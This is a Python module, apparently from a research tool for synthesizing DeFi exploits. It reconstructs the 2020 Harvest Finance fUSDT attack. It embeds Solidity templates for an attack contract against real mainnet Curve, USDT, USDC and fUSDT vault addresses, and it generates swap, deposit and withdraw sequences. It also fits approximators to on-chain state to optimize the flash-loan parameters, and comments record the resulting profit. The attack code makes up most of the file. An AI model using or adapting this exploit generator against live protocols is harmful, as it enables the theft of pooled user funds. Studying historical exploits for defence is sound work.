import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *



class Harvest_USDCAction():

    initialStates = [60577422, 47461863, 51229112, 57455853, 110975032]
    globalStates = initialStates.copy()
    # globalStates[0]: USDC_liquidity  60577422
    # globalStates[1]: USDT_liquidity  47461863
    # globalStates[2]: fUSDT underlying balance   51229112
    # globalStates[3]: invested_underlying_balances   57455853
    # globalStates[4]: fUSDT total supply   110975032

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/Harvest_USDCI.sol";           
         
// Block 11129500
// Block index 0
// Timestamp Mon, 26 Oct 2020 02:59:55 +0000
// Gas price 950 gwei
// Gas limit 10649595         
                     
contract Harvest_USDC_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapETHUSDTAddress = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant UniswapETHUSDCAddress = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
                    
    address private constant CRVStrategyStableMainnet_fUSDT   = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
                    
    address private constant yUSDTAddress = 0x83f798e925BcD4017Eb265844FDDAbb448f1707D;
    address private constant CurveFiAddress = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address private constant USDT_VaultProxyAddress = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;
                    
    address private constant StrategyAddress = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;
                    
    IUSDT USDT = IUSDT(USDTAddress);
    IUSDC USDC = IUSDC(USDCAddress);
    yUSDT _yUSDT = yUSDT(yUSDTAddress);
    yERC20 CURVE_yPool = yERC20(CurveFiAddress);
                    
    IfUSDT fUSDT = IfUSDT(USDT_VaultProxyAddress);
    IStrategy Strategy = IStrategy(StrategyAddress);
                    
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
                    
    string str80 = "";
    string str81 = "";
    string str82 = "";
                    
    constructor() payable {
        StandardToken(USDTAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(USDT_VaultProxyAddress, 2**256 - 1);
        EOA = msg.sender;
    }
                    
    receive() external payable {}

    '''

    startStr_attack = '''
                    
    // loan amount = 20000000 USDC and 5000 0000 USDT
    function attack( $$_$$ ) public {

    '''

    endStr_attack = """
        revert(ProfitSummary());
        // USDT balance: 50319523841845 || USDC balance: 20019021562311
        // current balance      : 50319524.097758 USDT and 20019021.563454 USDC
        // compared to flashloan: 50000000        USDT and 20000000        USDC
        // Profit                   319524        USDT and    19021 USDC
    }
    """  

    endStr_contract = """
    function CurveSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_yPool.balances(1) / 10**6;
        uint balance2 = CURVE_yPool.balances(2) / 10**6;
        return appendWithSpace( uint2str(balance1), uint2str(balance2) );
    }
                
    function fUSDTSummary_invested_underlying() internal returns (string memory _uintAsString){
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        str81 = append("invested underlying balance: ", uint2str(invested));
        return str81;
    }
                
    function fUSDTSummary() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDT.underlyingBalanceInVault() / 10 ** 6;
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        uint totalSupply = fUSDT.totalSupply() / 10 ** 6;
        str80 = append("underlyingBalance: ", uint2str(underlyingBalance));
        str81 = append("invested underlying balance: ", uint2str(invested));
        str82 = append("fUSDT total supply: ", uint2str(totalSupply));
        return appendWithSpace(str80, appendWithSpace(str81, str82));
    }
                
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = USDC.balanceOf(address(this)) / 10 ** 6;
        str80 = append("USDT balance: ", uint2str(balance1));
        str81 = append(" || USDC balance: ", uint2str(balance2));
        return append(str80, str81);
    }
                
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
                
                
    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
                
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
                
                
                
}
                """
    
    initialBalances = {"USDT": 50000000, "USDC": 20000000}
    currentBalances = initialBalances.copy()
    
    TokenPrices = {"USDT": 1.0, "USDC": 1.0}
    TargetTokens = list(TokenPrices.keys())


    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()


    def calcProfit(stats):
        if stats == None or len(stats) != 2:
            return 0
        profit = stats[0] - 50000000 + stats[1] - 20000000
        return profit


    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit



    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)
    

    def initialPass():
        action1 = Curve_USDC2USDT
        action2 = Curve_USDT2USDC
        action3 = fUSDT_deposit
        action4 = fUSDT_withdraw
        action_list_1 = [action1, action2, action3, action4]

        action1_prestate_dependency = [action1, action2, action3]
        action2_prestate_dependency = [action1, action2, action3]
        action3_prestate_dependency = [action1, action2]
        action4_prestate_dependency = [action1, action2, action3]

        # seq of actions
        ActionWrapper = Harvest_USDCAction
        action_lists = [action1_prestate_dependency + [action1], action2_prestate_dependency + [action2], action3_prestate_dependency + [action3], 
                        action4_prestate_dependency + [action4]]

        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))



    def runinitialPass():
        return



class Curve_USDC2USDT(Harvest_USDCAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None


    # Action Specific Variables
    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['USDT']
    range = [0, 12000000]   # 10554172


    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDC2USDT\n"
        action += '''       CURVE_yPool.exchange_underlying(1, 2, $$ * 10 ** 6, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDC2USDT\n"
        action += '''       str1 = CurveSummary();
        str2 = fUSDTSummary_invested_underlying(); 
        uint USDTgot = USDT.balanceOf(address(this));
        CURVE_yPool.exchange_underlying(1, 2, $$ * 10 ** 6, 0); // USDC to USDT
        USDTgot = USDT.balanceOf(address(this)) - USDTgot;
        str3 = CurveSummary();
        str4 = fUSDTSummary_invested_underlying();
        revert(appendWithSpace( appendWithSpace(str1, str2), appendWithSpace( appendWithSpace(str3, str4), uint2str(USDTgot / 10 ** 6) )));
        '''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve USDC balance
        cls.values[1].append(v1)  # Curve USDT balance
        cls.values[2].append(v2)  # invested underlying balance
        cls.values[3].append(v3)  # USDTOut
        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, 3])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, 3])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0, 1, 3])

        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):

        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[3], input]

        new_inputs = [inputs[0], inputs[1], inputs[3]]
        
        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        
        return output0, output1, output2, output3

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDC'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[3] = output2
        cls.currentBalances["USDT"] += output3
        return

    @classmethod
    def string(cls):
        return cls.__name__



class Curve_USDT2USDC(Harvest_USDCAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['USDC']
    range = [0, 12000000]  # 10564726



    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDT2USDC\n"
        action += '''      CURVE_yPool.exchange_underlying(2, 1, $$ * 10 ** 6, 0);  \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDT2USDC\n"
        action += '''
        str1 = CurveSummary();
        str2 = fUSDTSummary_invested_underlying();
        uint USDCgot = USDC.balanceOf( address(this) );
        CURVE_yPool.exchange_underlying(2, 1, $$ * 1e6, 0);       // USDT -> USDC
        str3 = CurveSummary();
        str4 = fUSDTSummary_invested_underlying();
        USDCgot = USDC.balanceOf( address(this) ) - USDCgot;
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace( str4, uint2str(USDCgot / 10 ** 6) ))));
        '''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3 = cls.aliquotValues(values)
        cls.values[0].append( v0 )  # Curve USDC balance
        cls.values[1].append( v1 )  # Curve USDT balance
        cls.values[2].append( v2 )  # invested underlying balance
        cls.values[3].append( v3 )  # USDTOut

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, 3])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, 3])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0, 1, 3])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[3], input]

        new_inputs = [inputs[0], inputs[1], inputs[3]]
        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        return output0, output1, output2, output3

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDT'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[3] = output2
        cls.currentBalances["USDC"] += output3
        return

    @classmethod
    def string(cls):
        return "Curve_USDT2USDC"


class fUSDT_deposit(Harvest_USDCAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None    

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['fUSDT']
    range = [0, 52000000]  # 49972546


    @classmethod
    def actionStr(cls):
        action = "      // Action: fUSDT_deposit\n"
        action += '''      fUSDT.deposit($$ * 10 ** 6); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: fUSDT_deposit\n"
        action += '''              str1 = fUSDTSummary();
        uint fUSDTgot = fUSDT.balanceOf(address(this));
        fUSDT.deposit($$ * 10 ** 6);
        str2 = fUSDTSummary();
        fUSDTgot = fUSDT.balanceOf(address(this)) - fUSDTgot;
        revert( appendWithSpace(appendWithSpace(str1, str2), appendWithSpace("fUSDT got: ", uint2str(fUSDTgot / 10 ** 6))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append( point ) 

        v0, v1, v2 = cls.aliquotValues( values )

        cls.values[0].append( v0 )  # fUSDT underlying balance
        cls.values[1].append( v1 )  # fUSDT total supply
        cls.values[2].append( v2 )  # fUSDTOut

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):

        inputs = [cls.globalStates[2], cls.globalStates[3], \
        cls.globalStates[4], input]
        
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        
        cls.currentBalances['USDT'] -= input
        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[2] = output0
        cls.globalStates[4] = output1
        if "fUSDT" not in cls.currentBalances:
            cls.currentBalances["fUSDT"] = 0
        cls.currentBalances["fUSDT"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__




class fUSDT_withdraw(Harvest_USDCAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['fUSDT']
    tokensOut = ['USDT']
    range = [0, 60000000]  # 51543726

    @classmethod
    def actionStr(cls):
        action = "      // Action: fUSDT_withdraw\n"
        action += '''      fUSDT.withdraw($$ * 10 ** 6); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''      // Collect: fUSDT_withdraw\n
        str1 = fUSDTSummary();
        uint USDTgot = USDT.balanceOf(address(this));
        fUSDT.withdraw($$ * 10 ** 6);
        USDTgot = USDT.balanceOf(address(this)) - USDTgot;
        str2 = fUSDTSummary();
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(USDTgot / 10 ** 6)));
        '''
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
            
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 
        v0, v1, v2 = cls.aliquotValues(values)

        cls.values[0].append( v0 )  # fUSDT underlying balance
        cls.values[1].append( v1 )  # fUSDT total supply
        cls.values[2].append( v2 )  # USDTOut
        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[2], cls.globalStates[3], \
        cls.globalStates[4], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        
        cls.currentBalances['fUSDT'] -= input
        output0, output1, output2 = cls.simulate(input)
        cls.globalStates[2] = output0
        cls.globalStates[4] = output1
        cls.currentBalances["USDT"] += output2

        return


    @classmethod
    def string(cls):
        return cls.__name__








def main():
    # config.method 
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 500000
    config.blockNum = 11129500
    config.contract_name = "Harvest_USDC_attack"


# Test for initial pass of data collecton: 
    Harvest_USDCAction.initialPass()
#     Harvest_USDCAction.runinitialPass()
    

# # Test for correct sequence of actions and correct sequence of parameters
#     initial_guess = [10554172, 49972546, 10564726, 51543726]

#     action1 = Curve_USDC2USDT
#     action2 = fUSDT_deposit
#     action3 = Curve_USDT2USDC
#     action4 = fUSDT_withdraw
#     action_list = [action1, action2, action3, action4]
#     ActionWrapper = Harvest_USDCAction

#     # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

#     actual_profit = 338448
#     print("actual profit: ", actual_profit)
#     e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
#     return actual_profit, e1, e2, e3, e4


if __name__ == "__main__":
    main()
    